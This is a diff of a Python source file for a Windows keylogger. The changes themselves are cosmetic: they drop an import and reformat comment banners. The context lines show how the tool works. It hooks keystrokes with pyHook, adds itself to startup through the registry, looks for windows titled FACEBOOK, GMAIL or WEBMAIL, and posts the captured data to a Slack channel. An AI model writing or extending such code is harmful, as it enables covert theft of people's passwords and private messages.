@@ -1,16 +1,16 @@
 import pythoncom, pyHook
 import os
 import sys
-import win32event, win32api, winerror, win32gui
+import win32event, win32api, winerror
 import configparser
 import time
 from datetime import datetime
 from slackclient import SlackClient
 from winreg import *
 
-#####################################################
-#				INITIALIZATION VARIABLES			#
-#####################################################
+#########################################
+#		INITIALIZATION VARIABLES		#
+#########################################
 
 # Slack link:
 config = configparser.ConfigParser()
@@ -27,9 +27,9 @@ max_length = 1
 key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']
 
 
-#####################################################
-#				KEYLOGGER FUNCTIONS 				#
-#####################################################
+#################################
+#		KEYLOGGER FUNCTIONS 	#
+#################################
 
 def startup(func):
 	"""
@@ -73,9 +73,9 @@ def log_on_cloud(client, channel, data):
 		channel=channel,
 		text=data)
 
-#####################################################
-#				ALGORITHM RELEVANT  				#
-#####################################################
+#################################
+#		ALGORITHM RELEVANT  	#
+#################################
 
 def is_relevant_window(WindowName, key_words):
 	res = False
@@ -86,9 +86,9 @@ def is_relevant_window(WindowName, key_words):
 	return res
 
 
-#####################################################
-#						MAIN						#
-#####################################################
+####################
+#		MAIN	   #
+####################
 
 if __name__ == '__main__':
 	try:
